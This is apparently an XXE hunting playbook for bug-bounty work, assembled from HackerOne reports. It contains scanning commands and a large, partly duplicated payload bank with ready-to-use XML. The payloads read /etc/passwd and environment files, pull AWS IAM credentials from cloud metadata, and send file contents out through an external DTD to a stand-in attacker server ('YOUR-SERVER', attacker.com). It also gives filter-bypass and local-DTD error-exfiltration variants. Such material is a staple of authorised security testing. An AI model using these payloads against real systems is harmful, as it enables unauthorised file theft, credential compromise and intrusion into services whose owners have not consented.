| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_xxe.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xxe.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xxe.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Point at XML/SOAP/SAML/SVG/office upload endpoints.

```sh
nuclei -u https://target -tags xxe \
       -severity low,medium,high,critical -rl 40 -o nuclei_xxe.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xxe -dast \
       -rl 40 -o nuclei_xxe_xxe.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_xxe_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Grep Patterns for Source Code Review

```bash
# PHP
grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .

# Java
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .

# Python
grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .

# Look for missing hardening
grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .
```

---

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class xxe --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class xxe
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class xxe
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class xxe --min-bounty 1000
```

### Related

- `hackerone-ssrf` (337 reports)
- `hackerone-rce` (1,399 reports)
- `hackerone-deserialization` (93 reports)

### Related

- `ssrf` (337 reports)
- `rce` (1,399 reports)
- `deserialization` (93 reports)

### JavaScript Patterns (source recon)

```javascript
// Look for in JS bundles
XMLSerializer
DOMParser
parseFromString
new ActiveXObject("Microsoft.XMLDOM")
$.parseXML(
xml2js
libxmljs
lxml
```

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/xxe/blind
2. https://ultrared.ai/blog/xxe-aws-credential-theft

## Additional notes

### Classic file read

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
```

### SSRF / cloud metadata

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
```

### XInclude / SVG / Office

```text
<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
```

### Parameters observed

`debug` · `status` · `type` · `top-text` · `bottom-text` · `id` · `_hxpage` · `max_file_size_kb` · `allow_file_type_list` · `EventAction` · `EventDate` · `url` · `RelayState` · `method` · `dl`

### XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx

`#500515` · Starbucks · $0 · critical · 2019-11-13 · ▲319
> Description: Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access…

### XXE on sms-be-vip.twitter.com in SXMP Processor

`#248668` · X / xAI · $0 · medium · 2017-07-26 · ▲258
> I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to https://www.owasp.org/index.php/XML External Entity (XXE) Processing

### XXE on https://duckduckgo.com

`#483774` · DuckDuckGo · $0 · critical · 2019-01-31 · ▲218
> An XML External Entity (XXE) injection vulnerability was discovered in the x.js endpoint on https://duckduckgo.com via u parameter. This was due to improper sanitation of external XML entities. The results was a leak of certain world readable files on the system. This issue was patched. Additionally, we intend to retire the endpoint in the very near future. Big thanks to @mik317 for reporting this issue!

### DMARC  Not found for paragonie.com   URGENT

`#179828` · Paragon Initiative Enterprises · $0 · critical · 2016-11-03 · ▲147
> Hi sir, , I am new hacker in hackerone platform I am glad to join paragonie bounty program ..i want to report a very critical bug that is i found DMARC missing for your domain paragonie.com Add DMARC record as soon as possible .. DMARC description Background Email authentication technologies SPF and DKIM were developed over a decade ago in order to provide greater assurance on the identity of the sender of a message.

### URL Patterns

```
/api/v*/xml
/upload
/import
/parse
/convert
/saml/acs
/sso/saml
/feed
/rss
/sitemap
/webdav
/soap/*
/wsdl
/service.asmx
/xmlrpc
/graphql (multipart with XML)
```

### Request/Response Headers

```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data  ← check file upload fields
Accept: application/xml
X-Content-Type-Options: (absent — good sign of loose parsing)
```

### Parser-ecosystem vulnerability matrix

XXE classic payloads (`<!ENTITY xxe SYSTEM "file://...">`) are not universally exploitable in 2026. Most mainstream language ecosystems have hardened their default XML parsers since 2018-2024. Fingerprint the target stack BEFORE investing time in XXE — sometimes the parser is already safe and the bug class doesn't apply.

| Ecosystem / parser | Default behavior on SYSTEM entity | Vulnerable by default? |
|---|---|---|
| Java SAX / DOM (`XMLInputFactory` without disabling external entities) | Expands SYSTEM file:// | **YES** |
| Java JAXB / JAX-WS (older Spring versions) | Expands | **YES** |
| PHP `DOMDocument` with `LIBXML_NOENT` flag | Expands SYSTEM | **YES** |
| PHP `simplexml_load_*` with `LIBXML_NOENT` | Expands | **YES** |
| .NET `XmlDocument` with `XmlResolver` explicitly set | Expands | **YES** |
| .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` explicitly set | Expands | **YES** (default since .NET 4.5.2 is `DtdProcessing.Prohibit`, which THROWS on any DOCTYPE — modern default is safe) |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 — see `docs/verification/phase2g-saml-mfa-xxe.md`) |
| Python `xml.dom.minidom` | Default safe in current versions | NO |
| Python `defusedxml.lxml` | Disabled | NO |
| Ruby Nokogiri default | Disabled | NO |
| Ruby Nokogiri with `Nokogiri::XML::ParseOptions::DTDLOAD` | Expands | **YES** |
| Apache Struts (older) | Often expands | **YES** |
| Embedded IoT / industrial XML processors (firmware) | Frequently vulnerable | **YES** |
| Microsoft Office OOXML processors that re-parse user content | Vulnerable in some legacy paths | **YES** |

**Fingerprint signals to look for:**

- `Server: Apache Tomcat`, `X-Powered-By: Servlet` → Java backend → **likely YES**
- `X-Powered-By: PHP/...` + endpoint that ingests XML → **likely YES** if app uses `DOMDocument`
- `Server: Microsoft-IIS` with `.aspx` and XML SOAP → **likely YES** on legacy code
- Server says nothing identifiable + endpoint accepts XML → **probe with `&hello;` first**; if the inline entity expands, escalate to SYSTEM. If the inline entity also fails to expand, the parser may be hardened — pivot.

**Pre-Severity Gate:** before claiming XXE on a candidate endpoint, run the inline-entity probe (`<!ENTITY hello "world!">` then `&hello;` in a node). If `hello!` does NOT echo back, parser-level entity expansion is disabled and SYSTEM file:// won't work either. Don't waste cycles on a hardened parser.

---

### Scenario A: Single Endpoint → 26 Domains Compromised (Uber-scale)

A tester discovered an XML parsing endpoint on one Uber subdomain. The backend processed XML using a vulnerable parser, and the server made outbound HTTP requests to attacker-controlled infrastructure (blind OOB). Because the vulnerable XML processing service was a shared internal microservice, the same vulnerability was reachable through 26+ different public-facing domains — all sharing the backend. A single payload could read `/etc/passwd`, internal config files, and reach AWS metadata endpoints, effectively giving access to credentials reusable across the entire infrastructure.

**Business impact**: Full internal service compromise across the majority of the production domain fleet; potential for credential theft and lateral movement.

### Scenario B: Document Upload → Local File Read on Twitter-scale Platform

An attacker uploaded a crafted XML-based document (e.g., SVG or Office format) to a document processing feature on a major social platform. The server-side parser processed the embedded DTD and external entity references, returning local file contents in the parsed output or error messages. The attacker could read application config files containing database connection strings, internal API keys, and potentially private user data stored on the same filesystem.

**Business impact**: Exposure of production secrets (database credentials, API keys) via a feature intended for harmless file uploads; no authentication bypass required beyond a standard user account.

### Scenario C: JSON API → Hidden XML Parser → SSRF to Internal Services

A REST API endpoint nominally accepting JSON was found to also parse requests submitted as `application/xml`. The underlying service converted XML to an internal format using an unpatched Java `DocumentBuilderFactory`. By injecting a SYSTEM entity pointing at `http://10.0.0.x` address ranges, the tester could probe internal services, reach an unauthenticated internal admin panel, and retrieve AWS instance metadata including temporary IAM credentials — all through a single API call requiring only a valid session token.

**Business impact**: Complete AWS credential compromise from a single authenticated API call, enabling privilege escalation from application-level user to cloud infrastructure administrator.

---

### Disclosed Report Citations (Backfill +6 — 2016-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Three cases (#7, #9, #10) are OOB-required (blind) — they cross-reference the `ssrf` OOB-Or-It-Didn't-Happen Gate and cannot be claimed without a Collaborator/interactsh callback.

5. **Mail.ru — Pulse RSS/Atom feed XXE (file read)** ([H1 #505947](https://hackerone.com/reports/505947))
    - Subclass: direct file-read XXE (in-band)
    - Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` inside RSS feed body → `<title>&xxe;</title>` reflected in response
    - Root cause: pulse.mail.ru RSS/Atom ingestion called an XML parser with `external general entities` enabled
    - Year: 2019 — **$6,000**

6. **Twitter — sms-be-vip.twitter.com SOAP/SXMP servlet XXE** ([H1 #248668](https://hackerone.com/reports/248668))
    - Subclass: SOAP XXE (cloudhopper SXMP servlet) — confirmed via HTTP callback **and** reflected file read
    - Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext;]>` chained in SXMP request body
    - Root cause: Cloudhopper SXMP servlet parsed inbound XML with default JAXP settings (entities resolved)
    - Year: 2017 — **$10,080** (classic SOAP-XXE reference case)

7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
    - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
    - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
    - Year: 2020 — Zivver had no paid program at the time

8. **Open-Xchange — Blind XXE via PowerPoint (.pptx) import** ([H1 #334488](https://hackerone.com/reports/334488))
    - Subclass: Office-doc XXE (PPTX = ZIP of XML parts), OOB-required
    - Payload: modify `ppt/slides/slide1.xml` inside the .pptx ZIP to include `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://attacker/d.dtd"> %a;]>`; external DTD chains parameter entities to exfil `file:///etc/passwd` over HTTP
    - Root cause: PowerPoint parser pre-rendered the XML parts of the OOXML container before disabling entity resolution
    - Year: 2018 — **$2,000**

9. **Uber — Blind OOB XXE on ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096))
    - Subclass: blind OOB XXE (third-party vendor product), OOB-required
    - Payload: `<!DOCTYPE r [<!ENTITY ping SYSTEM "http://attacker.example/">]><search><q>&ping;</q></search>`
    - Root cause: generic XML endpoint in Movement's vendor stack accepted XML and resolved system entities; no data exfil possible (sandboxed), only blind ping
    - Year: 2016 — **$500**

10. **Adobe Commerce / Magento — "CosmicSting" CVE-2024-34102** ([Assetnote writeup](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102))
    - Subclass: XXE-to-RCE (nested deserialization → XXE in Laminas request body) — modern, exploited in the wild
    - Payload: REST API JSON request whose nested `simplexml_load_string()` reaches `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/x.dtd"> %d;]>`; external DTD reads `app/etc/env.php` (admin crypt-key) and POSTs it back; key forges admin token → RCE
    - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
    - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8

---

### Error-based exfil via local-DTD repurposing (zero network egress)

When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
    %eval; %err;'>
  %local_dtd; ]>
```
Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)

### Classic In-Band File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Windows Equivalent

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE (AWS Metadata)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&ssrf;</data></root>
```

### SVG XXE (for file upload endpoints)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```

### Content-Type Swap (JSON to XML)

```bash
# Original JSON request
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user":"test"}'

# Converted to XML for XXE testing
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
```

### Defense: Keyword blacklist (`ENTITY`, `DOCTYPE`, `SYSTEM`)

```xml
<!-- Case variation -->
<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>

<!-- Encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>
(submit the entire payload UTF-16 encoded)

<!-- Parameter entity instead of general entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
```

### Defense: External entity fetching disabled (file:// blocked)

```xml
<!-- Try alternative URI schemes -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">       <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">   <!-- Java -->
<!ENTITY xxe SYSTEM "gopher://internal-service:80/_GET%20/">
```

### Defense: Input length limits

```xml
<!-- Use billion laughs to test parser limits, and use short file paths -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
]>
<!-- Escalate to demonstrate DoS if XXE file-read is patched -->
```

---

### Disclosed Report Citations (Backfill +6 — 2016-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Three cases (#7, #9, #10) are OOB-required (blind) — they cross-reference the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate and cannot be claimed without a Collaborator/interactsh callback.

5. **Mail.ru — Pulse RSS/Atom feed XXE (file read)** ([H1 #505947](https://hackerone.com/reports/505947))
    - Subclass: direct file-read XXE (in-band)
    - Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` inside RSS feed body → `<title>&xxe;</title>` reflected in response
    - Root cause: pulse.mail.ru RSS/Atom ingestion called an XML parser with `external general entities` enabled
    - Year: 2019 — **$6,000**

6. **Twitter — sms-be-vip.twitter.com SOAP/SXMP servlet XXE** ([H1 #248668](https://hackerone.com/reports/248668))
    - Subclass: SOAP XXE (cloudhopper SXMP servlet) — confirmed via HTTP callback **and** reflected file read
    - Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext;]>` chained in SXMP request body
    - Root cause: Cloudhopper SXMP servlet parsed inbound XML with default JAXP settings (entities resolved)
    - Year: 2017 — **$10,080** (classic SOAP-XXE reference case)

7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
    - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
    - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
    - Year: 2020 — Zivver had no paid program at the time

8. **Open-Xchange — Blind XXE via PowerPoint (.pptx) import** ([H1 #334488](https://hackerone.com/reports/334488))
    - Subclass: Office-doc XXE (PPTX = ZIP of XML parts), OOB-required
    - Payload: modify `ppt/slides/slide1.xml` inside the .pptx ZIP to include `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://attacker/d.dtd"> %a;]>`; external DTD chains parameter entities to exfil `file:///etc/passwd` over HTTP
    - Root cause: PowerPoint parser pre-rendered the XML parts of the OOXML container before disabling entity resolution
    - Year: 2018 — **$2,000**

9. **Uber — Blind OOB XXE on ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096))
    - Subclass: blind OOB XXE (third-party vendor product), OOB-required
    - Payload: `<!DOCTYPE r [<!ENTITY ping SYSTEM "http://attacker.example/">]><search><q>&ping;</q></search>`
    - Root cause: generic XML endpoint in Movement's vendor stack accepted XML and resolved system entities; no data exfil possible (sandboxed), only blind ping
    - Year: 2016 — **$500**

10. **Adobe Commerce / Magento — "CosmicSting" CVE-2024-34102** ([Assetnote writeup](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102))
    - Subclass: XXE-to-RCE (nested deserialization → XXE in Laminas request body) — modern, exploited in the wild
    - Payload: REST API JSON request whose nested `simplexml_load_string()` reaches `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/x.dtd"> %d;]>`; external DTD reads `app/etc/env.php` (admin crypt-key) and POSTs it back; key forges admin token → RCE
    - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
    - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8

---

## Companion methodology (merged, deduplicated)

Full text of every non-SKILL.md methodology file from the contributing skills — payload banks, technique references, reconnaissance and attack-class guides.

### Companion: hunting / references/payloads.md

# XXE — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`

- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`

- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`

- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`



## Payload bank



**23 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Classic file read



```text

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>

```



### Parameter entities / OOB



```text

<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>

<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>

<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>

<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>

```



### SSRF / cloud metadata



```text

<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>

```



### XInclude / SVG / Office



```text

<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>

<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>

```



### Filter bypass



```text

<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` (23)

- `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` (5 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4` |

| 2× | `<!DOCTYPE svg [ / <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> / %outside; / ]> / <svg> / <defs> / <pattern id="exploit"> / <t` |

| 2× | `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> / <!ENTITY exfil "%data;">` |

| 2× | `%eval` |

| 2× | `Content-Type: application/xml;charset=UTF-8` |

| 2× | `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` |

| 2× | `<!DOCTYPE foo [` |

| 2× | `<params>` |

| 2× | `<offset>0</offset>` |

| 2× | `<queryParams>` |

| 2× | `<query>&xxe;</query>` |

| 2× | `<sortBy>relevance</sortBy>` |

| 2× | `<fieldList>["id", "title"]</fieldList>` |

| 2× | `</queryParams>` |

| 2× | `<source>marketplace</source>` |

| 2× | `<rows>5</rows>` |

| 2× | `</params>` |

| 1× | `POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1 / Host: ███████informatica.com / [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]` |

| 1× | `███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144` |

| 1× | `46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http:/` |



## Parameters observed



`debug` · `status` · `type` · `top-text` · `bottom-text` · `id` · `_hxpage` · `max_file_size_kb` · `allow_file_type_list` · `EventAction` · `EventDate` · `url` · `RelayState` · `method` · `dl`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_xxe.txt` | 74 |

| `~/.local/share/hackerone-reports/wordlists/params_xxe.txt` | 15 |

| `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` | 23 |

| `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` | 5 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_xxe.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xxe.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xxe.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Point at XML/SOAP/SAML/SVG/office upload endpoints.



```sh

nuclei -u https://target -tags xxe \

       -severity low,medium,high,critical -rl 40 -o nuclei_xxe.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xxe -dast \

       -rl 40 -o nuclei_xxe_xxe.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_xxe_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Error-based exfil via local-DTD repurposing (zero network egress)

When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:

```xml

<!DOCTYPE foo [

  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

  <!ENTITY % ISOamso '

    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">

    %eval; %err;'>

  %local_dtd; ]>

```

Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)



### Classic In-Band File Read

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<root><data>&xxe;</data></root>

```



### Windows Equivalent

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">

]>

<root><data>&xxe;</data></root>

```



### Blind OOB — DNS/HTTP Callback

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">

]>

<root><data>&xxe;</data></root>

```



### Blind OOB — File Exfiltration via Parameter Entity (two-stage)

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY % file SYSTEM "file:///etc/passwd">

  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">

  %dtd;

]>

<root><data>trigger</data></root>

```



**evil.dtd (hosted on attacker server):**

```xml

<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">

%all;

```



### SSRF via XXE (AWS Metadata)

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

]>

<root><data>&ssrf;</data></root>

```



### SVG XXE (for file upload endpoints)

```xml

<?xml version="1.0" standalone="yes"?>

